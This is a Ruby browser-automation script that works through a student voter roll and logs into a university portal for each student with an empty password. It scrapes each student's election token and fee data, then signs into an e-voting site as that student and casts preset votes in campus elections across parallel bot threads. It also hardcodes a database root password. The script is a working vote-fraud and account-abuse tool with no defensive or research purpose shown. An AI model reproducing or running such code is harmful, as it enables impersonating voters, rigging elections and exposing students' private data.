require 'watir' # Crawler
require 'pry' # Ruby REPL
require 'rb-readline' # Ruby IRB
require 'awesome_print' # Console output
require 'watir-scroll'
require 'net/http'
require 'uri'
require 'json'
require 'mysql2' #database

require 'csv'

class EvoBot
    @id     
    @data     
    @browser     
    @client
    def initialize( params = {} )
        # @client = Mysql2::Client.new(:host => "localhost", :username => "root", :password =>"", :database =>"evoting" )
        @client = Mysql2::Client.new(:host => "localhost", :username => "root", :password =>"Alan!234", :database =>"evoting", :socket => "/var/run/mysqld/mysqld.sock" )
        @data = params.fetch(:data, [] ) 
        @id = params.fetch(:id, 0 ) 
        @baseUrl = "http://192.168.0.55/"
        @baseUrlEvoting = "http://192.168.0.153/"
        @browser = Watir::Browser.new :chrome

        puts( "Bot id : "+ "#{@id}" )

    end
    def get_id(  )
        return @id
    end
    def get_data(  )
        return @data[0]
    end
    def do_vote( nim, token )
        puts( "Bot id : "+ "#{@id}" + " do_vote | nim : " + "#{nim}" + ", Token : " + "#{token}"   )
        @browser.goto @baseUrlEvoting
        @browser.text_field(:name => "username").set nim
        @browser.text_field(:name => "password").set token
        @browser.execute_script('arguments[0].scrollIntoView();', @browser.button(:id => "blogin" ) )
        sleep(1)
        @browser.button(:id => "blogin" ).click 
        sleep(1)

        if @browser.url != "http://192.168.0.153/dashboard"
            # @baseUrlEvoting+"/dashboard" 
            puts @browser.url
            # http://192.168.0.153/dashboard
            return
        end
        if ! @browser.h3( :text => "Anda Sudah Memilih untuk periode saat ini").exists?
            begin
                # bem uho
                puts "bem uho : "

                sleep(1)
                radio = @browser.input( :type => "radio", :id => "suarauniv", :value => "12" )
                @browser.execute_script('arguments[0].scrollIntoView();', radio.parent.parent.parent )
                name = radio.parent.parent.parent.div( :class => "panel-body").div( :class => "col-md-6").span.text
                ap "bem uho : " + name
                sleep(1)
                radio.click

                # bem fakultas
                radio = @browser.input( :type => "radio", :id => "suarafak", :value => "30" )
                @browser.execute_script('arguments[0].scrollIntoView();', radio.parent.parent.parent )
                name = radio.parent.parent.parent.div( :class => "panel-body").div( :class => "col-md-6").span.text
                ap "bem fakultas : " + name
                sleep(1)
                radio.click

                # suarampm
                radio = @browser.input( :type => "radio", :id => "suarampm", :value => "36" )
                @browser.execute_script('arguments[0].scrollIntoView();', radio.parent.parent.parent )
                # name = radio.parent.parent.parent.div( :class => "panel-body").div( :class => "col-md-6").span.text
                # ap "bem suarampm : " + name
                sleep(1)
                radio.click

                # suaradpm
                radio = @browser.inputs( :type => "radio", :id => "suaradpm" )[0]
                @browser.execute_script('arguments[0].scrollIntoView();', radio.parent.parent.parent )
                # name = radio.parent.parent.parent.div( :class => "panel-body").div( :class => "col-md-6").span.text
                # ap "bem suaradpm : " + name
                sleep(1)
                radio.click

                vote_button = @browser.link( :id => "bvote")
                @browser.execute_script('arguments[0].scrollIntoView();', vote_button )
                vote_button.click

                sleep(1)
                @browser.button( :class => "btn btn-success", :text=> "Yes").click
            rescue
                ap "failed to vote"
            end
        else
            ap "sudah memilih"
        end
        
        # sleep(3000)
    end
    def do_scanning(  )
        puts( "Bot id : "+ "#{@id}" + " do scanning" )
        count = 90
        @browser = Watir::Browser.new :chrome
        @data = @data[90 .. @data.length ]
        @data.each do |row|
            puts( "Bot id : "+ "#{@id}" + " | target : " + row[0] + " | index " +  "#{count}" )
            nim = row[0]
            # nim = "e1e116017"
            pass = ""
            @browser.goto @baseUrl + "/index.php?exec=login"
            @browser.text_field(:name => "NIP").set nim
            @browser.text_field(:name => "password").set pass
            @browser.input(:type => "submit" ).click 
        
            sleep(1)   
            if  @browser.tables( :class => "box" ).length > 1
                begin
                    text = @browser.tables( :class => "box" )[1].tbody.trs[1].tds[1].text
                    text = text.split(/\n/)
                    if @browser.h2( :style => "color:red;font-size:25px" ).exists?
                        token = @browser.h2( :style => "color:red;font-size:25px" ).text
                        puts( token )
                        puts( text.inspect )
                        puts( text[5] )
                        ukt = text[5]
                        tokenfix = token[7, token.length-1]
                        puts(tokenfix)
                        self.do_vote( nim, tokenfix )
                        # self.do_vote( "A1A114052", "token" )
                        
                        # query = "INSERT INTO `users` (`id`, `nim`, `pass`, `ukt`, `token` ) VALUES ( NULL, " + "'#{nim}', " + "'#{pass}', " + "'#{ukt}'" + ", " + "'#{tokenfix}'" + ")"
                        # puts( query )
                        
                        # client.query(query)
                    else
                        puts( token )
                        puts( text.inspect )
                        puts( text[5] )
                        ukt = text[5]

                        # self.do_vote( nim, "token" ) 
                        # self.do_vote( "A1A114052", "token" ) 

                        # query = "INSERT INTO `users` (`id`, `nim`, `pass`, `ukt`) VALUES ( NULL, " + "'#{nim}', " + "'#{pass}', " + "'#{ukt}'" + ")"
                        # puts( query )
                            
                        # client.query(query)
                    end
                rescue
                    ap "failed get element"
                end
            end
            
            count += 1
            sleep(2)
        end
    end
end


# client = Mysql2::Client.new(:host => "localhost", :username => "root", :password =>"", :database =>"evoting" )
# @baseUrl = "http://192.168.0.55/"

table = CSV.read("DPS Fisip.csv")
puts( table.length )

bots = []
i = 0
start = 0
inc = 1500
begin
    data = table[start .. ( start + inc ) ]
    bots.push(
        EvoBot.new( 
            :id => i,
            :data => data
        )
    )
    puts( "start " + "#{start}" )
    puts( "data[start] " + "#{data[0]}" )
    puts( "data.length " + "#{data.length}" )
    puts( "BLOCK" )
    
    i += 1
    start = start + inc
end until start > table.length
# S1B116051
bots.each do |bot|
    puts( bot.get_id(  ) )
    puts( bot.get_data(  ) )

    Thread.new{
        bot.do_scanning(  )
        # bot.do_vote( "S1B116051", "VWYND2" )
    }
end
sleep(10000)
